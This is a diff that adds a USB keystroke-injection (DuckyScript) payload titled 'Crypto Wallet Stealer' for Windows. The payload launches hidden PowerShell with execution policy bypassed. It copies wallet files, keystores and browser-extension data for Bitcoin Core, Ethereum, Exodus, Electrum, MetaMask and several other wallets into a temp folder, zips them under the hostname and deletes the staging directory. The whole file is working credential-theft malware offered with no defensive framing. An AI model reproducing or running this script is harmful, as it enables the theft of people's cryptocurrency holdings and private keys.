@@ -1,0 +1,89 @@
+REM =============================================
+REM Title: Crypto Wallet Stealer
+REM Author: bad-antics
+REM Description: Extract cryptocurrency wallet data
+REM Category: nullsec/exfil
+REM Target: Windows 10/11
+REM =============================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 800
+
+REM Create loot directory
+STRING $d="$env:TEMP\cryptoloot";mkdir $d -Force|Out-Null
+ENTER
+DELAY 200
+
+REM Bitcoin Core
+STRING if(Test-Path "$env:APPDATA\Bitcoin"){cp "$env:APPDATA\Bitcoin\wallet.dat" "$d\bitcoin_wallet.dat" 2>$null}
+ENTER
+DELAY 200
+
+REM Ethereum / Geth
+STRING if(Test-Path "$env:APPDATA\Ethereum\keystore"){cp -r "$env:APPDATA\Ethereum\keystore" "$d\ethereum" -Force}
+ENTER
+DELAY 200
+
+REM Exodus
+STRING if(Test-Path "$env:APPDATA\Exodus"){cp -r "$env:APPDATA\Exodus\exodus.wallet" "$d\exodus" -Force 2>$null}
+ENTER
+DELAY 200
+
+REM Electrum
+STRING if(Test-Path "$env:APPDATA\Electrum\wallets"){cp -r "$env:APPDATA\Electrum\wallets" "$d\electrum" -Force}
+ENTER
+DELAY 200
+
+REM Atomic Wallet
+STRING if(Test-Path "$env:APPDATA\atomic\Local Storage\leveldb"){cp -r "$env:APPDATA\atomic\Local Storage\leveldb" "$d\atomic" -Force}
+ENTER
+DELAY 200
+
+REM Coinomi
+STRING if(Test-Path "$env:LOCALAPPDATA\Coinomi\Coinomi\wallets"){cp -r "$env:LOCALAPPDATA\Coinomi\Coinomi\wallets" "$d\coinomi" -Force}
+ENTER
+DELAY 200
+
+REM Jaxx Liberty
+STRING if(Test-Path "$env:APPDATA\com.liberty.jaxx"){cp -r "$env:APPDATA\com.liberty.jaxx\IndexedDB" "$d\jaxx" -Force 2>$null}
+ENTER
+DELAY 200
+
+REM MetaMask (Chrome extension)
+STRING $mmPath="$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Local Extension Settings\nkbihfbeogaeaoehlefnkodbefgpgknn"
+ENTER
+DELAY 100
+
+STRING if(Test-Path $mmPath){cp -r $mmPath "$d\metamask_chrome" -Force}
+ENTER
+DELAY 200
+
+REM MetaMask (Firefox)
+STRING $ffProfiles="$env:APPDATA\Mozilla\Firefox\Profiles";if(Test-Path $ffProfiles){Get-ChildItem $ffProfiles -Directory|%{$mm="$($_.FullName)\storage\default\moz-extension*";Get-ChildItem $mm -Directory -ErrorAction SilentlyContinue|%{cp -r $_.FullName "$d\metamask_ff_$($_.Name)" -Force 2>$null}}}
+ENTER
+DELAY 300
+
+REM Trust Wallet
+STRING if(Test-Path "$env:APPDATA\@aspect-wallet"){cp -r "$env:APPDATA\@aspect-wallet" "$d\trust" -Force 2>$null}
+ENTER
+DELAY 200
+
+REM Binance
+STRING if(Test-Path "$env:APPDATA\Binance"){cp -r "$env:APPDATA\Binance" "$d\binance" -Force 2>$null}
+ENTER
+DELAY 200
+
+REM Compress
+STRING Compress-Archive -Path $d -DestinationPath "$env:TEMP\crypto_$(hostname).zip" -Force
+ENTER
+DELAY 400
+
+STRING Remove-Item $d -Recurse -Force
+ENTER
+
+STRING exit
+ENTER
